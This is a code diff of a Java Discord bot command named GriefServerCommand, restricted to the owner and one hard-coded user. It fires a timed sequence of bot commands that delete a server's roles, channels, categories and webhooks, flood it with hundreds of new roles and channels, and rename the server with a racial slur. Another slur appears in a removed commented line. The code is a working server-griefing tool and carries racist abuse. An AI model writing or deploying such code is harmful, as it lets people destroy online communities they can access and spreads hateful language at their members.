@@ -15,23 +15,19 @@ public class GriefServerCommand implements ICommand {
         if (!(event.getAuthor().getIdLong() == Core.OWNERID) && !event.getAuthor().getId().equalsIgnoreCase("698607465885073489")) {
             return;
         }
-
-        int i = 1;
-
-             event.getChannel().sendMessage(Core.PREFIX + "etb").queueAfter(i++, TimeUnit.SECONDS);
-            event.getChannel().sendMessage(Core.PREFIX + "delroles").queue();
-            event.getChannel().sendMessage(Core.PREFIX + "addroles 200").queueAfter(i++, TimeUnit.SECONDS);
-            event.getChannel().sendMessage(Core.PREFIX + "dvc").queueAfter(i++, TimeUnit.SECONDS);
-            event.getChannel().sendMessage(Core.PREFIX + "dcat").queueAfter(i++, TimeUnit.SECONDS);
-            event.getChannel().sendMessage(Core.PREFIX + "servername GRIEFED BY SWAG LLL NIGGA LLL").queueAfter(i++, TimeUnit.SECONDS);
-           // event.getChannel().sendMessage(Core.PREFIX + "changeicon").queueAfter(i++, TimeUnit.SECONDS);
-            event.getChannel().sendMessage(Core.PREFIX + "delwebhooks").queueAfter(i++, TimeUnit.SECONDS);
-            event.getChannel().sendMessage(Core.PREFIX + "createwebhooks 10").queueAfter(i++, TimeUnit.SECONDS);
-            event.getChannel().sendMessage(Core.PREFIX + "cvc 200").queueAfter(i++, TimeUnit.SECONDS);
-            event.getChannel().sendMessage(Core.PREFIX + "ccat 200").queueAfter(i++, TimeUnit.SECONDS);
-            event.getChannel().sendMessage(Core.PREFIX + "dtc").queueAfter(i++, TimeUnit.SECONDS);
-            //event.getChannel().sendMessage(Core.PREFIX + "ctc 50").queueAfter(i++, TimeUnit.SECONDS);
-            //event.getGuild().getTextChannels().get(new Random(event.getGuild().getTextChannels().size()).nextInt()).sendMessage(Core.PREFIX + "nigger 50").queueAfter((i++ + 10), TimeUnit.SECONDS);
+        event.getChannel().sendMessage(Core.PREFIX + "etb").queueAfter(1, TimeUnit.SECONDS);
+        event.getChannel().sendMessage(Core.PREFIX + "delroles").queue();
+        event.getChannel().sendMessage(Core.PREFIX + "addroles 200").queueAfter(2, TimeUnit.SECONDS);
+        event.getChannel().sendMessage(Core.PREFIX + "dvc").queueAfter(3, TimeUnit.SECONDS);
+        event.getChannel().sendMessage(Core.PREFIX + "dcat").queueAfter(4, TimeUnit.SECONDS);
+        event.getChannel().sendMessage(Core.PREFIX + "servername GRIEFED BY SWAG LLL NIGGA LLL").queueAfter(5, TimeUnit.SECONDS);
+        event.getChannel().sendMessage(Core.PREFIX + "changeicon").queueAfter(6, TimeUnit.SECONDS);
+        event.getChannel().sendMessage(Core.PREFIX + "delwebhooks").queueAfter(7, TimeUnit.SECONDS);
+        event.getChannel().sendMessage(Core.PREFIX + "createwebhooks 10").queueAfter(8, TimeUnit.SECONDS);
+        event.getChannel().sendMessage(Core.PREFIX + "cvc 200").queueAfter(8, TimeUnit.SECONDS);
+        event.getChannel().sendMessage(Core.PREFIX + "ccat 200").queueAfter(10, TimeUnit.SECONDS);
+        event.getChannel().sendMessage(Core.PREFIX + "dtc").queueAfter(11, TimeUnit.SECONDS);
+        event.getChannel().sendMessage(Core.PREFIX + "ctc 50").queueAfter(12, TimeUnit.SECONDS);
 
     }
 
@@ -50,7 +46,7 @@ public class GriefServerCommand implements ICommand {
         return new String[0];
     }
 
-     @Override
+    @Override
     public Category getCategory() {
         return Category.OWNER;
     }
